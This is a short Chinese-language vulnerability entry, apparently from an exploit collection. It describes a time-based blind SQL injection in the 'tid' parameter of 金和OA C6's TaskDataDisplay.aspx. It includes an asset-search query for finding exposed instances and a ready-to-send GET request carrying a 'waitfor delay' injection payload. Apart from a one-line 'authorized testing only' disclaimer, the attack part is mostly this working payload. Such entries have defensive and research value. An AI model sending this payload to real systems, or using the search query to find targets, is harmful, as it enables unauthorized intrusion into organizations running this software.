---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 金和OA TaskDataDisplay.aspx SQL注入漏洞

## 漏洞描述

金和OA C6 `/C6/JHSoft.Web.Tasks/TaskDataDisplay.aspx/` 接口 `tid` 参数存在 SQL 注入漏洞（延时盲注）。

## 影响版本

```
金和OA C6
```

## 网络测绘

```
app="金和OA"
```

## 漏洞复现

```
GET /C6/JHSoft.Web.Tasks/TaskDataDisplay.aspx/?tid=1;waitfor%20delay%20%270:0:3%27-- HTTP/1.1
```

> 仅限授权测试。PoC 逻辑提取自 I-Wanna-Get-All 集成利用工具对应模块。
